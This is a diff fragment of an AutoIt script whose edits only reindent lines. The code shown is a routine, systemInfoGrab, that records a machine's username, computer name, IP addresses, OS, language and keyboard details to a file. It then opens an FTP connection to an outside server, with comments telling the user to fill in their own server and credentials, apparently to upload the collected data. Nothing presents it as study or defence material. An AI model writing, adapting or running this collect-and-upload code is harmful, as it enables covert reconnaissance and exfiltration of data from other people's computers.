@@ -31,11 +31,11 @@ Func systemInfoGrab()
 		Return False
 	EndIf
 
-	FileWrite($hFileOpen, "CPU Architecture: " & @CPUArch & @CRLF)
-	FileWrite($hFileOpen, "Keyboard Layout: " & @KBLayout & @CRLF)
-	FileWrite($hFileOpen, "MUI Language: " & @MUILang & @CRLF)
-	FileWrite($hFileOpen, "OS Architecture: " & @OSArch & @CRLF)
-	FileWrite($hFileOpen, "OS Language: " & @OSLang & @CRLF)
+    FileWrite($hFileOpen, "CPU Architecture: " & @CPUArch & @CRLF)
+    FileWrite($hFileOpen, "Keyboard Layout: " & @KBLayout & @CRLF)
+    FileWrite($hFileOpen, "MUI Language: " & @MUILang & @CRLF)
+    FileWrite($hFileOpen, "OS Architecture: " & @OSArch & @CRLF)
+    FileWrite($hFileOpen, "OS Language: " & @OSLang & @CRLF)
     FileWrite($hFileOpen, "OS Type: " & @OSType & @CRLF)
     FileWrite($hFileOpen, "OS Version: " & @OSVersion &@CRLF)
     FileWrite($hFileOpen, "OS Build: " & @OSBuild & @CRLF)
@@ -43,17 +43,17 @@ Func systemInfoGrab()
     FileWrite($hFileOpen, "Computer Name: " & @ComputerName & @CRLF)
     FileWrite($hFileOpen, "Username: " & @UserName & @CRLF)
     FileWrite($hFileOpen, "IP Address - First Adapter: " & @IPAddress1 & @CRLF)
-	FileWrite($hFileOpen, "IP Address - Second Adapter: " & @IPAddress2 & @CRLF)
-	FileWrite($hFileOpen, "IP Address - Third Adapter: " & @IPAddress3 & @CRLF)
-	FileWrite($hFileOpen, "IP Address - Fourth Adapter: " & @IPAddress4 & @CRLF)
+    FileWrite($hFileOpen, "IP Address - Second Adapter: " & @IPAddress2 & @CRLF)
+    FileWrite($hFileOpen, "IP Address - Third Adapter: " & @IPAddress3 & @CRLF)
+    FileWrite($hFileOpen, "IP Address - Fourth Adapter: " & @IPAddress4 & @CRLF)
     FileWrite($hFileOpen, "Screen Pixel Height: " & @DesktopHeight & @CRLF)
     FileWrite($hFileOpen, "Screen Pixel Width: " & @DesktopWidth & @CRLF)
 
-	FileClose($hFileOpen)
+    FileClose($hFileOpen)
 
-	Sleep(5000) ; Sleeps for 5 seconds, to make sure the file has been opened, written to, and closed. Feel free to change this to your desired amount, or get rid of it completely.
+    Sleep(5000) ; Sleeps for 5 seconds, to make sure the file has been opened, written to, and closed. Feel free to change this to your desired amount, or get rid of it completely.
 
-	Local $server = "ftp.drivehq.com"            ; Replace with your FTP Server, unless you're using DriveHQ FTP Server.
+    Local $server = "ftp.drivehq.com"            ; Replace with your FTP Server, unless you're using DriveHQ FTP Server.
     Local $username = "Your Username Goes Here." ; Replace with your username.
     Local $pass = "Your Password Goes Here."     ; Replace with your password.
     Local $hOpen = _FTP_Open("MyFTP Control")
